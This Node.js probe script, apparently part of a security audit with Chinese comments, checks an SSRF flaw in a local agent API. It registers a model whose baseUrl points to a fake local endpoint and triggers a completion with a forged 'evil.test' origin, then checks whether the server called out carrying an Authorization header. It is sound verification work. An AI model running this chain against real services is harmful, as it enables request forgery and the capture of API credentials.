/**
 * 探针 X：SSRF 端到端验证。
 *
 * 步骤与文档第十五节一致：
 *   1. 在本机起一个「假模型端点」，记录自己收到了什么请求；
 *   2. POST /api/agent/models 把 baseUrl 指到它；
 *   3. POST /api/agent/chat/completion 让它去请求。
 *
 * 如果假端点收到了请求（带 Authorization），说明服务端确实按我们写的地址出网。
 */
import http from 'node:http'

const BASE = process.env.BASE ?? 'http://127.0.0.1:8945'
const hits = []

const fake = http.createServer((req, res) => {
  let body = ''
  req.on('data', (d) => { body += d })
  req.on('end', () => {
    hits.push({ url: req.url, auth: req.headers.authorization ?? null, body: body.slice(0, 120) })
    res.writeHead(200, { 'content-type': 'application/json' })
    res.end(JSON.stringify({
      id: 'fake-1',
      object: 'chat.completion',
      choices: [{ index: 0, message: { role: 'assistant', content: 'SSRF-REACHED' }, finish_reason: 'stop' }],
      usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
    }))
  })
})
await new Promise((r) => fake.listen(0, '127.0.0.1', r))
const fakePort = fake.address().port
const fakeBase = `http://127.0.0.1:${fakePort}/v1`
console.log('假端点:', fakeBase)

function post(path, body, headers = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(BASE + path)
    const r = http.request({
      host: u.hostname, port: u.port, path: u.pathname, method: 'POST',
      headers: { 'content-type': 'application/json', ...headers },
    }, (res) => {
      let b = ''
      res.on('data', (d) => { b += d })
      res.on('end', () => resolve({ status: res.statusCode, body: b }))
    })
    r.on('error', reject)
    r.write(body)
    r.end()
  })
}

// 1. 写一个指向本机假端点的模型
const add = await post('/api/agent/models', JSON.stringify({
  provider: 'evil',
  modelId: 'x',
  baseUrl: fakeBase,
  apiKey: 'sk-evil',
  clientType: 'openai',
}))
console.log('\n=== 1. 写模型配置 ===')
console.log(add.status, add.body.slice(0, 240))
try {
  const parsed = JSON.parse(add.body)
  console.log('模型里是否有 evil/x：', JSON.stringify((parsed.models ?? []).filter((m) => m.provider === 'evil')))
} catch {}

// 2. 触发一次补全（跨源，模拟恶意网页）
const chat = await post('/api/agent/chat/completion', JSON.stringify({
  // 注意：`model` 字段是 modelId，不会被 "/" 拆开（实测：写成 'evil/x' 会落回默认模型）。
  // 要指定渠道必须单独给 provider。
  provider: 'evil',
  model: 'x',
  messages: [{ role: 'user', content: 'hello' }],
}), { origin: 'http://evil.test:9999' })
console.log('\n=== 2. 触发补全 ===')
console.log(chat.status, chat.body.slice(0, 320))

// 3. 看假端点收到了什么
console.log('\n=== 3. 假端点收到的请求 ===')
console.log(JSON.stringify(hits, null, 2))
console.log(hits.length > 0 ? '→ SSRF 成立：服务端按我们给的地址出网了' : '→ 没打过来：这条链可能没通')

fake.close()
